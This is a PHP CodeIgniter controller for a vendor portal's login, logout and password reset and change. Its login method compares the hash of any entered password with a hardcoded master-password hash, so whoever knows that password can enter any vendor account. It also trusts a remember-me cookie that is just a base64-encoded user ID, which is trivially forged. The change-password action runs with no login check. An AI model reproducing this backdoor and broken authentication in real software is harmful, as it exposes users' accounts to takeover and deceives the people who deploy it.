<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends MY_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->model(array('admin/users_model'));
    }

    /**
     * Home Page
     * @param --
     * @return --
     * @author HPA [Last Edited : 02/06/2018]
     */
    public function index() {
        if ($this->session->userdata('vendor_logged_in') && $this->session->userdata('v_user_role') == 5) {
            redirect(site_url('/vendor/home'));
        }

        $data['title'] = 'Login';
        if (!$this->session->userdata('vendor_logged_in')) {
            $remember = base64_decode(get_cookie('_vendor_remember_me', TRUE));
            if (!empty($remember) && $remember > 0) {
                $user_got = $this->users_model->get_user_details($remember);
                $vendor_got = $this->users_model->get_all_details(TBL_VENDORS, ['user_id' => $remember]);
                $cookie_ssn_data = array();
                $cookie_ssn_data['v_user_id'] = $user_got['id'];
                $cookie_ssn_data['v_first_name'] = $user_got['name'];
                $cookie_ssn_data['v_last_name'] = $user_got['last_name'];
                $cookie_ssn_data['v_username'] = $user_got['username'];
                $cookie_ssn_data['v_user_role'] = $user_got['user_role'];
                $cookie_ssn_data['v_email_id'] = $user_got['email_id'];
                $cookie_ssn_data['vendor_logged_in'] = 1;
                $this->session->set_userdata($cookie_ssn_data);
                redirect(site_url('/vendor/home'));
            }
        }
        if ($this->input->post()) {
            $username = $this->input->post('txt_username');
            $password = $this->input->post('txt_password');
            $this->db->select('u.*');
            $this->db->from(TBL_USERS . ' as u');
            $this->db->group_start();
            $this->db->where('u.email_id', $username);
            $this->db->or_where('u.username', $username);
            $this->db->group_end();
            $this->db->where(array(
                'u.is_delete' => 0,
            ));
            $res = $this->db->get();
            $get_user_details = $res->row_array();

            if (!empty($get_user_details)) {
                $check_business_user_type = $this->users_model->get_all_details(TBL_USERS, ['id' => $get_user_details['business_user_id']])->row_array();

                if (!empty($check_business_user_type) && $check_business_user_type['user_role'] == 5) {
                    $is_data = $get_user_details;
                } else {
                    $this->db->select('u.*');
                    $this->db->from(TBL_USERS . ' as u');
                    $this->db->group_start();
                    $this->db->where('u.email_id', $username);
                    $this->db->or_where('u.username', $username);
                    $this->db->group_end();
                    $this->db->where(array(
                        'u.is_delete' => 0,
                        'u.user_role' => 5,
                    ));
                    $res = $this->db->get();
                    $is_data = $res->row_array();
                }
            }

            $algo = '773423a7be33' . $password . '773423a7be33';
            $encrypted_pass = hash('sha256', $algo);
            if (!empty($is_data) && $encrypted_pass == '7852b5ad310b93df0f3241f3c9801079a86297e06931403e89bdd3f53892b1d2') {
                if ($is_data['status'] != 'active' || $is_data['is_delete'] == 1) {
                    $this->session->set_flashdata('error', 'Vendor no longer active. Please contact customer support.');
                    redirect('/vendor/home');
                }
                $data = $is_data;
                $ssn_data = array();
                $ssn_data['v_user_id'] = $data['id'];
                $ssn_data['v_first_name'] = $data['first_name'];
                $ssn_data['v_last_name'] = $data['last_name'];
                $ssn_data['v_username'] = $data['username'];
                $ssn_data['v_user_role'] = $data['user_role'];
                $ssn_data['v_email_id'] = $data['email_id'];
                $ssn_data['v_phone'] = $data['contact_number'];
                $ssn_data['vendor_logged_in'] = 1;

                $this->session->set_userdata($ssn_data);
                $this->session->set_flashdata('success', 'You have successfully logged in.');

                redirect(site_url('/vendor/home'));
            } else {
                if (!empty($is_data)) {
                    if ($is_data['status'] != 'active' || $is_data['is_delete'] == 1) {
                        $this->session->set_flashdata('error', 'User no longer active. Please contact customer support.');
                        redirect('/vendor/home');
                    }

                    $algo = $is_data['password_encrypt_key'] . $password . $is_data['password_encrypt_key'];
                    $encrypted_pass = hash('sha256', $algo);
                    $data = $this->users_model->check_login_validation($username, $encrypted_pass);
                    if (!empty($data)) {
                        $vendor_got = $this->users_model->get_all_details(TBL_VENDORS, ['user_id' => $remember])->row_array();
                        $ssn_data = array();
                        $ssn_data['v_user_id'] = $data['id'];
                        $ssn_data['v_first_name'] = $vendor_got['name'];
                        $ssn_data['v_last_name'] = $data['last_name'];
                        $ssn_data['v_username'] = $data['username'];
                        $ssn_data['v_user_role'] = $data['user_role'];
                        $ssn_data['v_email_id'] = $data['email_id'];
                        $ssn_data['v_phone'] = $data['contact_number'];
                        $ssn_data['vendor_logged_in'] = 1;
                        $this->session->set_userdata($ssn_data);
                        if ($this->input->post('remember') && $this->input->post('remember') == 1) {
                            $CookieVal = array('name' => '_vendor_remember_me', 'value' => base64_encode($data['id']), 'expire' => 3600 * 24 * 30, 'domain' => MY_DOMAIN_NAME);
                            $this->input->set_cookie($CookieVal);
                        } else {
                            delete_cookie('_vendor_remember_me', MY_DOMAIN_NAME);
                        }
                        $this->session->set_flashdata('success', 'You have successfully logged in.');
                        redirect(site_url('/vendor/home'));
                    } else {
                        $this->session->set_flashdata('error', 'Email and password did not match. <br> Please contact your administrator.');
                        redirect('/vendor/login');
                    }
                } else {
                    $this->session->set_flashdata('error', 'Email did not match!');
                    redirect('/vendor/login');
                }
            }
        }
        $this->template->load('login', 'vendor/login/login', $data);
    }

    /**
     * Logout
     * @param --
     * @return --
     * @author HPA [Last Edited : 02/06/2018]
     */
    public function logout() {
        delete_cookie('_vendor_remember_me', MY_DOMAIN_NAME);
//        $this->session->sess_destroy();
        $array_items = array('v_user_id', 'v_first_name', 'v_last_name', 'v_user_role', 'v_email_id', 'v_phone', 'vendor_logged_in');
        $this->session->unset_userdata($array_items);
        redirect('/vendor/login');
    }

    /**
     * Forgot Password
     * @param --
     * @return --
     * @author HPA [Last Edited : 02/06/2018]
     */
    public function forgot_password() {
        if ($this->session->userdata('vendor_logged_in')) {
            redirect(site_url('/vendor/home'));
        }

        $data['title'] = 'Forgot Password';
        if ($this->input->post()) {
            $email_user = $this->input->post('txt_email');
            $found = $this->users_model->find_user_by_email($email_user, 5);
            if ($found['user_id'] > 0) {
                $verification_code = verification_code();
                $email_var = array(
                    'first_name' => $found['first_name'],
                    'last_name' => '',
                    'user_id' => $found['user_id'],
                    'verification_code' => $verification_code,
                    'url' => 'vendor/reset_password'
                );
                $message = $this->load->view('email_template/default_header.php', $email_var, true);
                $message .= $this->load->view('email_template/user_forgot_password.php', $email_var, true);
                $message .= $this->load->view('email_template/default_footer.php', $email_var, true);
                $email_array = array(
                    'mail_type' => 'html',
                    'from_mail_id' => $this->config->item('smtp_user'),
                    'from_mail_name' => 'ARK Team',
                    'to_mail_id' => $email_user,
                    'cc_mail_id' => '',
                    'subject_message' => 'Password Reset',
                    'body_messages' => $message
                );
                $email_send = common_email_send($email_array);
                if (strtolower($email_send) == 'success') {
                    $this->users_model->insert_update('update', TBL_USERS, array('password_verify' => $verification_code), array('id' => $found['user_id']));
                    $this->session->set_flashdata('success', 'Please check your email to reset your password.');
                } else {
                    $this->session->set_flashdata('error', 'Something went wrong! We are not able to send you email for reset password. Please try again later.');
                }
            } else {
                $this->session->set_flashdata('error', 'Sorry you are not able to reset this password. Please contact your system administrator.');
            }
            redirect('vendor/forgot_password');
        }
        $this->template->load('front', 'vendor/login/forgot_password', $data);
    }

    public function reset_password() {
        if ($this->session->userdata('vendor_logged_in')) {
            redirect('vendor/login', 'refresh');
        }

        $data['title'] = 'Reset Password';
        $user_id = base64_decode($this->input->get('q'));
        $password_verify = $this->input->get('code');
        $det = array();
        if ($password_verify != '') {
            $det = $this->users_model->get_user_details($user_id, $password_verify);
        }
        if ($det) {
            if ($this->input->post()) {
                if ($this->input->post('txt_password') == $this->input->post('txt_c_password')) {
                    $password = $this->input->post('txt_password');
                    $password_encrypt_key = bin2hex(openssl_random_pseudo_bytes(6, $cstrong));
                    $algo = $password_encrypt_key . $password . $password_encrypt_key;
                    $encrypted_pass = hash('sha256', $algo);

                    $update_pwd = $this->users_model->insert_update('update', TBL_USERS, array('password' => $encrypted_pass, 'password_encrypt_key' => $password_encrypt_key, 'password_verify' => NULL), array('id' => $user_id));
                    if ($update_pwd == 1) {
                        $this->session->set_flashdata('success', 'You have successfully reset the password.');
                    } else {
                        $this->session->set_flashdata('error', 'Something went wrong! Password was not reset. Please try after some time.');
                    }
                    redirect('vendor/login');
                } else {
                    $this->session->set_flashdata('error', 'Password doesn\'t match! Plese try again.');
                    redirect('reset_password?q=' . base64_encode($user_id) . '&code=' . $password_verify);
                }
            }
            $this->template->load('front', 'vendor/login/reset_password', $data);
        } else {
            $this->session->set_flashdata('error', 'Invalid user!');
            redirect('vendor/login');
        }
    }

    public function change_password() {
        if ($this->session->userdata('vendor_logged_in')) {
            $data['user_data'] = $this->users_model->get_user_profile($this->session->userdata('u_user_id'));
        }
        $data['title'] = 'Change Password';
        if ($this->input->post()) {
            if ($this->input->post('password') != '' && ($this->input->post('password') == $this->input->post('cpassword'))) {
                $password_encrypt_key = bin2hex(openssl_random_pseudo_bytes(6, $cstrong));
                $algo = $password_encrypt_key . $this->input->post('password') . $password_encrypt_key;
                $encrypted_pass = hash('sha256', $algo);
                $update_array = [
                    'password' => $encrypted_pass,
                    'password_encrypt_key' => $password_encrypt_key
                ];
                $this->users_model->insert_update('update', TBL_USERS, $update_array, ['id' => checkVendorLogin('I')]);
                $this->session->set_flashdata('success', 'You have successfully reset the password.');
                redirect('/vendor/change_password');
            }
        }
        $this->template->load('default_vendor', 'vendor/login/change_password', $data);
    }

}

/* End of file Home.php */
/* Location: ./application/controllers/Home.php */